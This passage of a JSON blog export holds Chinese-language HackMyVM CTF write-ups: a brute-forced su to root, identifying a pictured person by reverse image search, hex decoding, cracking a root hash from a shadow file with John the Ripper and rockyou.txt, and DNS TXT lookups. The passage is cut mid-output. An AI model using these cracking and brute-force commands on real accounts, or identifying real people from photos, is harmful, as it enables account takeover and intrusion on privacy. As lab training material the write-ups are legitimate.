root\n\ud83d\udcd6 Wordlist | xato10000.txt\n\ud83d\udd0e Status   | 3412/10000/34%/1998\n\ud83d\udca5 Password | 1998\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\nandrea@LAB-Bruteforce:/tmp$ su -\nPassword: \nroot@LAB-Bruteforce:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\n```\n\nsentence", "top": 0, "createdAt": 1751016515, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P23": {"htmlDir": "docs/post/Challenge 003 -tu-zhong-shi-shui-\uff1f.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 003 \u56fe\u4e2d\u662f\u8c01\uff1f", "postUrl": "post/Challenge%20003%20-tu-zhong-shi-shui-%EF%BC%9F.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/23", "commentNum": 0, "wordCount": 1381, "description": "### \u6311\u6218\u4fe1\u606f\n\n*   **\u6311\u6218\u540d\u79f0/\u7f16\u53f7:** Challenge 003\n*   **\u6311\u6218\u94fe\u63a5:** [https://hackmyvm.eu/challenges/challenge.php?c=003](https://hackmyvm.eu/challenges/challenge.php?c=003)\n\n### \u521d\u59cb\u89c2\u5bdf\n\n![\u6311\u6218003\u754c\u9762\u53ca\u95ee\u9898](https://7r1umphk.github.io/image/20250502150751314.png)\n\n\u8bbf\u95ee\u6311\u6218\u9875\u9762\u540e\uff0c\u9875\u9762\u663e\u793a\u4e00\u4e2a\u95ee\u9898 'Who is she?'\uff08\u5979\u662f\u8c01\uff1f\uff09\uff0c\u5e76\u9644\u5e26\u4e86\u4e00\u5f20\u4eba\u7269\u7167\u7247\u3002\u540c\u65f6\uff0c\u9875\u9762\u7ed9\u51fa\u4e86 Flag \u7684\u683c\u5f0f\u8981\u6c42\uff1a`HMV{namelastname}`\uff0c\u5e76\u4e3e\u4f8b `HMV{johnwick}`\u3002\u8fd9\u8868\u660e\u6211\u4eec\u9700\u8981\u8bc6\u522b\u51fa\u56fe\u7247\u4e2d\u7684\u4eba\u7269\uff0c\u5e76\u5c06\u5176\u59d3\u540d\u6309\u7167\u201c\u540d\u59d3\u201d\uff08\u5c0f\u5199\uff0c\u65e0\u7a7a\u683c\uff09\u7684\u683c\u5f0f\u586b\u5165 Flag \u4e2d\u3002\n\n\u56fe\u7247\u5185\u5bb9\u5982\u4e0b\uff1a\n\n![\u6311\u6218003\u4e2d\u7684\u4eba\u7269\u56fe\u7247](https://7r1umphk.github.io/image/20250502150641114.jpg)\n\n### \u5206\u6790\u4e0e\u6280\u672f\u8bf4\u660e\n\n\u8be5\u6311\u6218\u7684\u6838\u5fc3\u4efb\u52a1\u662f**\u901a\u8fc7\u56fe\u50cf\u8bc6\u522b\u7279\u5b9a\u4eba\u7269**\u3002\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684**\u5f00\u6e90\u60c5\u62a5\uff08Open Source Intelligence, OSINT\uff09**\u6536\u96c6\u573a\u666f\uff0c\u7279\u522b\u662f\u5728\u6d89\u53ca\u56fe\u50cf\u4fe1\u606f\u65f6\u3002\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u5e38\u7528\u4e14\u6709\u6548\u7684\u6280\u672f\u662f**\u53cd\u5411\u56fe\u50cf\u641c\u7d22 (Reverse Image Search)**\u3002\n\n**\u53cd\u5411\u56fe\u50cf\u641c\u7d22**\u662f\u4e00\u79cd\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u56fe\u50cf\u4f5c\u4e3a\u67e5\u8be2\u6761\u4ef6\u6765\u641c\u7d22\u4e92\u8054\u7f51\u7684\u6280\u672f\u3002\u4e0e\u8f93\u5165\u5173\u952e\u8bcd\u67e5\u627e\u76f8\u5173\u6587\u672c\u6216\u56fe\u50cf\u4e0d\u540c\uff0c\u7528\u6237\u4e0a\u4f20\u4e00\u5f20\u56fe\u7247\u6216\u63d0\u4f9b\u56fe\u7247\u7684 URL\uff0c\u641c\u7d22\u5f15\u64ce\u4f1a\u67e5\u627e\u4e0e\u8be5\u56fe\u7247\u76f8\u540c\u6216\u89c6\u89c9\u4e0a\u76f8\u4f3c\u7684\u56fe\u7247\uff0c\u5e76\u53ef\u80fd\u63d0\u4f9b\u5173\u4e8e\u56fe\u7247\u6765\u6e90\u3001\u5185\u5bb9\u4ee5\u53ca\u76f8\u5173\u7f51\u9875\u7684\u4fe1\u606f\u3002\n\n\u5e38\u7528\u7684\u53cd\u5411\u56fe\u50cf\u641c\u7d22\u670d\u52a1\u5305\u62ec\uff1a\n\n*   Google Images (\u8c37\u6b4c\u56fe\u7247\u641c\u7d22)\n*   TinEye\n*   Bing Visual Search (\u5fc5\u5e94\u89c6\u89c9\u641c\u7d22)\n*   Yandex Images\n\n### \u6c42\u89e3\u8fc7\u7a0b\n\n1. **\u6267\u884c\u53cd\u5411\u641c\u7d22:** \u6211\u4eec\u9009\u62e9\u4f7f\u7528 **Google Images** \u8fdb\u884c\u53cd\u5411\u641c\u7d22\u3002\u8bbf\u95ee Google Images \u7f51\u7ad9 ([https://images.google.com/](https://images.google.com/))\uff0c\u70b9\u51fb\u641c\u7d22\u6846\u4e2d\u7684\u76f8\u673a\u56fe\u6807\uff08Search by image\uff09\uff0c\u7136\u540e\u7c98\u8d34\u56fe\u7247\u7684 URL \u6216\u4e0a\u4f20\u5df2\u4fdd\u5b58\u7684\u56fe\u7247\u6587\u4ef6\u3002\n2. **\u5206\u6790\u7ed3\u679c:** Google Images \u7684\u641c\u7d22\u7ed3\u679c\u8fc5\u901f\u8bc6\u522b\u51fa\u4e86\u56fe\u7247\u4e2d\u7684\u4eba\u7269\u3002\n\n   ![Google\u56fe\u7247\u641c\u7d22\u7ed3\u679c](https://7r1umphk.github.io/image/20250502151052521.png)\n\n   \u641c\u7d22\u7ed3\u679c\u660e\u786e\u6307\u51fa\u8be5\u4eba\u7269\u662f **Gata Cattana**\u3002\n\n3. **\u683c\u5f0f\u5316 Flag:** \u6839\u636e\u6311\u6218\u8981\u6c42\u7684 `HMV{namelastname}` \u683c\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u5c06\u59d3\u540d 'Gata Cattana' \u8f6c\u6362\u4e3a\u5c0f\u5199\u5e76\u53bb\u9664\u7a7a\u683c\uff0c\u5f97\u5230 `gatacattana`\u3002\u5c06\u5176\u653e\u5165 `HMV{}` \u4e2d\u3002\n\n### \u7ed3\u679c\uff1aFlag\n\n\u6700\u7ec8\u5f97\u5230\u7684 Flag \u662f\uff1a\n\n```\nHMV{gatacattana}\n```\nsentence", "top": 0, "createdAt": 1751016525, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P24": {"htmlDir": "docs/post/Challenge 004 -shi-liu-jin-zhi-de-mi-mi.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 004 \u5341\u516d\u8fdb\u5236\u7684\u79d8\u5bc6", "postUrl": "post/Challenge%20004%20-shi-liu-jin-zhi-de-mi-mi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/24", "commentNum": 0, "wordCount": 1379, "description": "### \u6311\u6218\u4fe1\u606f\n\n*   **\u6311\u6218\u540d\u79f0/\u7f16\u53f7:** Challenge 004\n*   **\u6311\u6218\u94fe\u63a5:** [https://hackmyvm.eu/challenges/challenge.php?c=004](https://hackmyvm.eu/challenges/challenge.php?c=004)\n\n### \u521d\u59cb\u89c2\u5bdf\n\n![\u6311\u6218004\u754c\u9762](https://7r1umphk.github.io/image/20250502151318558.png)\n\n\u8bbf\u95ee\u6311\u6218\u9875\u9762\u540e\uff0c\u9875\u9762\u76f4\u63a5\u5c55\u793a\u4e86\u4e00\u957f\u4e32\u7531\u6570\u5b57\u548c\u5b57\u6bcd\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff1a\n\n```\n686d767b6d79666c61676973656173797d\n```\n\n\u4efb\u52a1\u76ee\u6807\u662f\u89e3\u7801\u6216\u8f6c\u6362\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4ee5\u83b7\u5f97 Flag\u3002\n\n### \u5206\u6790\u4e0e\u6280\u672f\u8bf4\u660e\n\n\u4ed4\u7ec6\u89c2\u5bdf\u7ed9\u51fa\u7684\u5b57\u7b26\u4e32 `686d767b6d79666c61676973656173797d`\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5b83\u5177\u6709**\u5341\u516d\u8fdb\u5236\uff08Hexadecimal\uff09**\u8868\u793a\u6cd5\u7684\u663e\u8457\u7279\u5f81\uff1a\n\n1.  **\u5b57\u7b26\u96c6:** \u5b57\u7b26\u4e32\u4ec5\u5305\u542b\u6570\u5b57 `0` \u5230 `9` \u4ee5\u53ca\u5c0f\u5199\u5b57\u6bcd `a` \u5230 `f`\u3002\u8fd9\u662f\u5341\u516d\u8fdb\u5236\u8868\u793a\u6cd5\u7684\u6807\u51c6\u5b57\u7b26\u96c6\uff08\u6709\u65f6\u4e5f\u4f7f\u7528\u5927\u5199 `A` \u5230 `F`\uff09\u3002\n2.  **\u7528\u9014:** \u5341\u516d\u8fdb\u5236\u5e38\u7528\u4e8e\u4ee5\u6587\u672c\u5f62\u5f0f\u7d27\u51d1\u5730\u8868\u793a**\u4e8c\u8fdb\u5236\u6570\u636e**\u3002\u4e0e\u76f4\u63a5\u663e\u793a\u4e8c\u8fdb\u5236\uff080\u548c1\uff09\u76f8\u6bd4\uff0c\u5341\u516d\u8fdb\u5236\u66f4\u6613\u8bfb\u5199\uff0c\u5e76\u4e14\u6bd4\u5341\u8fdb\u5236\u66f4\u80fd\u76f4\u63a5\u53cd\u6620\u5e95\u5c42\u7684\u6bd4\u7279\u7ed3\u6784\u3002\u5b83\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5185\u5b58\u5730\u5740\u3001\u989c\u8272\u4ee3\u7801\u3001\u6587\u4ef6\u7b7e\u540d\u3001\u6570\u636e\u7f16\u7801\u7b49\u9886\u57df\u3002\n3.  **\u539f\u7406:** \u5341\u516d\u8fdb\u5236\u662f\u4e00\u79cd\u57fa\u6570\u4e3a 16 \u7684\u8ba1\u6570\u7cfb\u7edf\u3002\u6bcf\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u5b57\u4ee3\u8868 4 \u4e2a\u6bd4\u7279\uff08\u56e0\u4e3a 2^4 = 16\uff09\u3002\u56e0\u6b64\uff0c**\u4e24\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u5b57**\u53ef\u4ee5\u7cbe\u786e\u5730\u8868\u793a\u4e00\u4e2a**\u5b57\u8282\uff088 \u6bd4\u7279\uff09**\u3002\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u5c24\u5176\u662f\u5728\u5904\u7406\u6587\u672c\u6570\u636e\u65f6\uff0c\u8fd9\u4e00\u5b57\u8282\u901a\u5e38\u5bf9\u5e94\u4e00\u4e2a ASCII \u5b57\u7b26\u3002\n\n### \u89e3\u7801\u8fc7\u7a0b\n\n\u89e3\u7801\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u5de5\u5177\uff0c**CyberChef** \u4f9d\u7136\u662f\u4e00\u4e2a\u975e\u5e38\u4fbf\u6377\u7684\u9009\u62e9\uff1a\n\n1.  **\u8bbf\u95ee** CyberChef \u7f51\u7ad9: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)\n2.  **\u8f93\u5165 (Input):** \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32 `686d767b6d79666c61676973656173797d` \u7c98\u8d34\u5230\u201cInput\u201d\u6846\u4e2d\u3002\n3.  **\u9009\u62e9\u64cd\u4f5c (Operations):** \u5728\u5de6\u4fa7\u64cd\u4f5c\u5217\u8868\u4e2d\u641c\u7d22 'From Hex'\uff0c\u7136\u540e\u5c06\u5176\u62d6\u62fd\u5230\u201cRecipe\u201d\u533a\u57df\u3002\n4.  **\u8f93\u51fa (Output):** \u201cOutput\u201d\u533a\u57df\u5c06\u81ea\u52a8\u663e\u793a\u89e3\u7801\u540e\u7684\u7ed3\u679c\u3002\n\n\u4e5f\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177\u8fdb\u884c\u89e3\u7801\uff1a\n\n*   \u5728 Linux/macOS \u7cfb\u7edf\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528 `xxd` \u547d\u4ee4\uff1a\n    ```bash\n    echo '686d767b6d79666c61676973656173797d' | xxd -r -p\n    ```\n* \u6267\u884c\u89e3\u7801\u64cd\u4f5c\u540e\uff0c\u6211\u4eec\u5f97\u5230\u4ee5\u4e0b ASCII \u660e\u6587\u5b57\u7b26\u4e32\uff1a\n\n```\nhmv{myflagiseasy}\n```\n\n### \u7ed3\u679c\uff1aFlag\n\n\u89e3\u7801\u540e\u7684\u5b57\u7b26\u4e32\u5373\u4e3a\u672c\u6311\u6218\u7684 Flag\u3002\n\n```\nhmv{myflagiseasy}\n```\nsentence", "top": 0, "createdAt": 1751016528, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P25": {"htmlDir": "docs/post/Challenge 005 -po-jie- Shadow -wen-jian.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 005 \u7834\u89e3 Shadow \u6587\u4ef6", "postUrl": "post/Challenge%20005%20-po-jie-%20Shadow%20-wen-jian.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/25", "commentNum": 0, "wordCount": 2831, "description": "### \u6311\u6218\u4fe1\u606f\n\n*   **\u6311\u6218\u540d\u79f0/\u7f16\u53f7:** Challenge 005\n*   **\u6311\u6218\u94fe\u63a5:** [https://hackmyvm.eu/challenges/challenge.php?c=005](https://hackmyvm.eu/challenges/challenge.php?c=005)\n\n### \u521d\u59cb\u89c2\u5bdf\n\n![image-20250502152010221](https://7r1umphk.github.io/image/20250502152010304.png)\n\n\u8bbf\u95ee\u6311\u6218\u9875\u9762\u540e\uff0c\u63cf\u8ff0\u544a\u77e5\u6211\u4eec\u83b7\u53d6\u4e86\u4e00\u4e2a\u76ee\u6807\u673a\u5668\u7684 `/etc/shadow` \u6587\u4ef6\uff0c\u4f46\u65e0\u6cd5\u7834\u89e3\u5176\u4e2d\u7684 `root` \u7528\u6237\u5bc6\u7801\u3002\u6311\u6218\u8981\u6c42\u6211\u4eec\u627e\u51fa `root` \u7528\u6237\u7684\u5bc6\u7801\uff0c\u5e76\u4ee5 `HMV{rootpassword}` \u7684\u683c\u5f0f\u63d0\u4ea4 Flag\u3002\n\n\u9875\u9762\u63d0\u4f9b\u4e86\u4e00\u4e2a\u540d\u4e3a `shadow.txt` \u7684\u6587\u4ef6\u4f9b\u4e0b\u8f7d\u3002\n\n### \u5206\u6790\u4e0e\u6280\u672f\u8bf4\u660e\n\n**1. `/etc/shadow` \u6587\u4ef6:**\n\u5728 Linux \u548c\u7c7b Unix \u7cfb\u7edf\u4e2d\uff0c`/etc/shadow` \u6587\u4ef6\u7528\u4e8e\u5b89\u5168\u5730\u5b58\u50a8\u7528\u6237\u7684\u5bc6\u7801\u4fe1\u606f\u3002\u4e0e\u65e9\u671f\u7684 `/etc/passwd` \u6587\u4ef6\uff08\u6240\u6709\u7528\u6237\u53ef\u8bfb\uff09\u4e0d\u540c\uff0c`/etc/shadow` \u6587\u4ef6\u901a\u5e38\u53ea\u6709 `root` \u7528\u6237\u6709\u8bfb\u53d6\u6743\u9650\uff0c\u8fd9\u5927\u5927\u63d0\u9ad8\u4e86\u5bc6\u7801\u5b89\u5168\u6027\u3002\u8be5\u6587\u4ef6\u5b58\u50a8\u7684\u662f\u7528\u6237\u5bc6\u7801\u7684**\u54c8\u5e0c\u503c (Hash)**\uff0c\u800c\u975e\u660e\u6587\u5bc6\u7801\u3002\n\n\u4e00\u4e2a\u5178\u578b\u7684 `/etc/shadow` \u6587\u4ef6\u6761\u76ee\u683c\u5f0f\u5982\u4e0b\uff1a\n`username:password_hash:last_password_change:min_days:max_days:warn_days:inactive_days:expire_date:reserved`\n\n\u6211\u4eec\u5173\u5fc3\u7684\u4e3b\u8981\u662f\u7b2c\u4e8c\u4e2a\u5b57\u6bb5\uff1a`password_hash`\u3002\n\n**2. \u5bc6\u7801\u54c8\u5e0c:**\n\u5bc6\u7801\u54c8\u5e0c\u662f\u4e00\u79cd\u5355\u5411\u51fd\u6570\u5904\u7406\u8fc7\u7a0b\uff0c\u5b83\u5c06\u4efb\u610f\u957f\u5ea6\u7684\u5bc6\u7801\u8f6c\u6362\u4e3a\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u3001\u770b\u8d77\u6765\u968f\u673a\u7684\u5b57\u7b26\u4e32\uff08\u54c8\u5e0c\u503c\uff09\u3002\u5173\u952e\u5728\u4e8e\u8fd9\u4e2a\u8fc7\u7a0b\u662f**\u4e0d\u53ef\u9006\u7684**\uff0c\u5373\u65e0\u6cd5\u4ece\u54c8\u5e0c\u503c\u76f4\u63a5\u8ba1\u7b97\u51fa\u539f\u59cb\u5bc6\u7801\u3002\u5f53\u7528\u6237\u767b\u5f55\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5c06\u5176\u8f93\u5165\u7684\u5bc6\u7801\u8fdb\u884c\u76f8\u540c\u7684\u54c8\u5e0c\u8fd0\u7b97\uff0c\u7136\u540e\u6bd4\u8f83\u8ba1\u7b97\u51fa\u7684\u54c8\u5e0c\u503c\u4e0e\u5b58\u50a8\u5728 `/etc/shadow` \u4e2d\u7684\u54c8\u5e0c\u503c\u662f\u5426\u4e00\u81f4\u3002\n\n\u5e38\u89c1\u7684 Linux \u5bc6\u7801\u54c8\u5e0c\u7b97\u6cd5\u5305\u62ec MD5crypt (`$1$`)\u3001SHA256crypt (`$5$`) \u548c SHA512crypt (`$6$`) \u7b49\u3002\u54c8\u5e0c\u503c\u5b57\u7b26\u4e32\u5f00\u5934\u7684 `$id$` \u90e8\u5206\u6807\u8bc6\u4e86\u6240\u4f7f\u7528\u7684\u7b97\u6cd5\u3002\n\n**3. \u5bc6\u7801\u7834\u89e3 - \u5b57\u5178\u653b\u51fb:**\n\u7531\u4e8e\u65e0\u6cd5\u4ece\u54c8\u5e0c\u76f4\u63a5\u53cd\u63a8\u5bc6\u7801\uff0c\u7834\u89e3\u5bc6\u7801\u54c8\u5e0c\u7684\u5e38\u7528\u65b9\u6cd5\u4e4b\u4e00\u662f**\u5b57\u5178\u653b\u51fb (Dictionary Attack)**\u3002\u8fd9\u79cd\u65b9\u6cd5\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u5305\u542b\u5927\u91cf\u5e38\u7528\u5bc6\u7801\u3001\u5355\u8bcd\u3001\u77ed\u8bed\u7b49\u7684\u5217\u8868\uff08\u79f0\u4e3a**\u5b57\u5178\u6587\u4ef6**\u6216**\u8bcd\u5178**\uff0cWordlist\uff09\u3002\u7834\u89e3\u5de5\u5177\u4f1a\u9010\u4e00\u8bfb\u53d6\u5b57\u5178\u4e2d\u7684\u8bcd\u8bed\uff0c\u4f7f\u7528\u4e0e\u76ee\u6807\u54c8\u5e0c\u76f8\u540c\u7684\u7b97\u6cd5\u8ba1\u7b97\u8be5\u8bcd\u8bed\u7684\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u4e0e\u76ee\u6807\u54c8\u5e0c\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u5339\u914d\u6210\u529f\uff0c\u5c31\u610f\u5473\u7740\u627e\u5230\u4e86\u539f\u59cb\u5bc6\u7801\u3002\n\n**John the Ripper (John)** \u662f\u4e00\u4e2a\u975e\u5e38\u6d41\u884c\u7684\u5f00\u6e90\u5bc6\u7801\u7834\u89e3\u5de5\u5177\uff0c\u652f\u6301\u591a\u79cd\u54c8\u5e0c\u7c7b\u578b\u548c\u653b\u51fb\u6a21\u5f0f\u3002`rockyou.txt` \u662f\u4e00\u4e2a\u6781\u5176\u8457\u540d\u4e14\u5e9e\u5927\u7684\u5bc6\u7801\u5b57\u5178\u6587\u4ef6\uff0c\u5305\u542b\u4e86\u6570\u767e\u4e07\u4e2a\u4ece\u771f\u5b9e\u6570\u636e\u6cc4\u9732\u4e8b\u4ef6\u4e2d\u6536\u96c6\u7684\u5e38\u7528\u5bc6\u7801\uff0c\u5e38\u7528\u4e8e\u5bc6\u7801\u5b89\u5168\u5ba1\u8ba1\u548c CTF \u6bd4\u8d5b\u3002\n\n### \u6c42\u89e3\u8fc7\u7a0b\n\n1.  **\u4e0b\u8f7d\u6587\u4ef6:** \u4ece\u6311\u6218\u9875\u9762\u4e0b\u8f7d `shadow.txt` \u6587\u4ef6\u3002\n2.  **\u51c6\u5907\u5de5\u5177\u548c\u5b57\u5178:** \u786e\u4fdd\u7cfb\u7edf\u4e2d\u5b89\u88c5\u4e86 `john` (John the Ripper)\u3002\u540c\u65f6\uff0c\u9700\u8981 `rockyou.txt` \u5b57\u5178\u6587\u4ef6\u3002\u5728 Kali Linux \u7b49\u6e17\u900f\u6d4b\u8bd5\u53d1\u884c\u7248\u4e2d\uff0c\u5b83\u901a\u5e38\u4f4d\u4e8e `/usr/share/wordlists/rockyou.txt.gz`\uff0c\u53ef\u80fd\u9700\u8981\u5148\u4f7f\u7528 `gzip -d /usr/share/wordlists/rockyou.txt.gz` \u547d\u4ee4\u89e3\u538b\u7f29\u3002\n3.  **\u6267\u884c\u7834\u89e3:** \u6253\u5f00\u7ec8\u7aef\uff0c\u4f7f\u7528 `john` \u547d\u4ee4\u8fdb\u884c\u5b57\u5178\u653b\u51fb\u3002\u547d\u4ee4\u683c\u5f0f\u5982\u4e0b\uff1a\n    ```bash\n    john --wordlist=<\u5b57\u5178\u6587\u4ef6\u8def\u5f84> <shadow\u6587\u4ef6\u8def\u5f84>\n    ```\n    \u5177\u4f53\u5230\u672c\u4f8b\uff0c\u547d\u4ee4\u4e3a\uff1a\n    ```bash\n    john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt\n    ```\n\n4.  **\u5206\u6790\u8f93\u51fa:** `john` \u4f1a\u5f00\u59cb\u5c1d\u8bd5\u5b57\u5178\u4e2d\u7684\u5bc6\u7801\u3002\u5f53\u627e\u5230\u5339\u914d\u7684\u5bc6\u7801\u65f6\uff0c\u4f1a\u663e\u793a\u51fa\u6765\u3002\u6839\u636e\u63d0\u4f9b\u7684\u89e3\u9898\u8fc7\u7a0b\u622a\u56fe\uff0c`john` \u7684\u8f93\u51fa\u663e\u793a\uff1a\n\n    ```\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/test]\n    \u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt\n    Created directory: /home/kali/.john\n    Using default input encoding: UTF-8\n    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x]) \n    Cost 1 (iteration count) is 5000 for all loaded hashes\n    Will run 8 OpenMP threads\n    Press 'q' or Ctrl-C to abort, almost any other key for status\n    reddragon        (root)      # <--- \u6210\u529f\u7834\u89e3\uff01root \u7528\u6237\u7684\u5bc6\u7801\u662f reddragon\n    1g 0:00:00:00 DONE (2025-05-02 03:18) 2.439g/s 24975p/s 24975c/s 24975C/s total90..1asshole\n    Use the '--show' option to display all of the cracked passwords reliably\n    Session completed.\n    ```\n    \u8f93\u51fa\u660e\u786e\u663e\u793a `root` \u7528\u6237\u7684\u5bc6\u7801\u5df2\u88ab\u7834\u89e3\uff0c\u4e3a `reddragon`\u3002\n\n5.  **\u683c\u5f0f\u5316 Flag:** \u6839\u636e\u6311\u6218\u8981\u6c42\u7684 `HMV{rootpassword}` \u683c\u5f0f\uff0c\u5c06\u7834\u89e3\u5f97\u5230\u7684\u5bc6\u7801\u586b\u5165\u3002\n\n### \u7ed3\u679c\uff1aFlag\n\n\u6210\u529f\u7834\u89e3\u5f97\u5230\u7684 `root` \u5bc6\u7801\u4e3a `reddragon`\uff0c\u56e0\u6b64 Flag \u662f\uff1a\n\n```\nHMV{reddragon}\n```\nsentence", "top": 0, "createdAt": 1751016530, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P26": {"htmlDir": "docs/post/Challenge 006\uff1aTXT-ji-lu-de-mi-mi.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 006\uff1aTXT\u8bb0\u5f55\u7684\u79d8\u5bc6", "postUrl": "post/Challenge%20006%EF%BC%9ATXT-ji-lu-de-mi-mi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/26", "commentNum": 0, "wordCount": 1998, "description": "# \u6311\u6218\u4fe1\u606f\n\n### \u6311\u6218\u4fe1\u606f\n\n*   **\u6311\u6218\u540d\u79f0/\u7f16\u53f7:** Challenge 006\n*   **\u6311\u6218\u94fe\u63a5:** [https://hackmyvm.eu/challenges/challenge.php?c=006](https://hackmyvm.eu/challenges/challenge.php?c=006)\n\n### \u521d\u59cb\u89c2\u5bdf\n\n![image-20250518100536187](https://7r1umphk.github.io/image/20250518100536383.webp)\n\n\u6211\u4eec\u5f97\u5230\u4e86\u50cf `'hackmyvm.eu. 100 IN TXT'` \u8fd9\u6837\u7684\u63d0\u793a\uff0c\u90a3\u76ee\u6807\u5c31\u975e\u5e38\u660e\u786e\u4e86\u2014\u2014\u76f4\u5954 `hackmyvm.eu` \u7684 TXT \u8bb0\u5f55\u53bb\uff01\n\n## \u63a2\u7d22\u8fc7\u7a0b\n\n\u6709\u4e86\u8fd9\u4e48\u660e\u786e\u7684\u6307\u5411\uff0c\u54b1\u4eec\u5c31\u7528 `dig` \u547d\u4ee4\u6765\u4e00\u63a2\u7a76\u7adf\u3002\n\n### 1.\u5e38\u89c4A\u8bb0\u5f55\u67e5\u8be2\n\n\u867d\u7136\u76ee\u6807\u76f4\u6307TXT\u8bb0\u5f55\uff0c\u4f46\u517b\u6210\u597d\u4e60\u60ef\uff0c\u5148\u770b\u770bA\u8bb0\u5f55\u603b\u6ca1\u9519\uff0c\u4e86\u89e3\u4e00\u4e0b\u57df\u540d\u6307\u5411\u7684IP\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ dig hackmyvm.eu \n\n; <<>> DiG 9.20.8-6-Debian <<>> hackmyvm.eu\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62911\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232\n;; QUESTION SECTION:\n;hackmyvm.eu.                   IN      A\n\n;; ANSWER SECTION:\nhackmyvm.eu.            5       IN      A       188.68.49.239\n\n;; Query time: 60 msec\n;; SERVER: 192.168.205.2#53(192.168.205.2) (UDP)\n;; WHEN: Sat May 17 22:05:57 EDT 2025\n;; MSG SIZE  rcvd: 56\n```\n\n\u55ef\uff0c`hackmyvm.eu` \u6307\u5411 `188.68.49.239`\u3002\u4fe1\u606fget\uff0c\u4f46\u5bf9\u8fd9\u4e2a\u7279\u5b9a\u6311\u6218\u6765\u8bf4\uff0c\u4e0d\u662f\u91cd\u70b9\u3002\n\n### 2. \u67e5\u8be2TXT\u8bb0\u5f55\n\n\u73b0\u5728\uff0c\u6839\u636e\u6211\u4eec\u7684\u201c\u60c5\u62a5\u201d\uff08\u6216\u8005\u8bf4\u5e38\u89c4\u601d\u8def\uff09\uff0c\u76f4\u63a5\u67e5\u8be2 `hackmyvm.eu` \u7684 TXT \u8bb0\u5f55\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ dig txt hackmyvm.eu\n\n; <<>> DiG 9.20.8-6-Debian <<>> txt hackmyvm.eu\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12739\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232\n;; QUESTION SECTION:\n;hackmyvm.eu.                   IN      TXT\n\n;; ANSWER SECTION:\nhackmyvm.eu.            5       IN      TXT     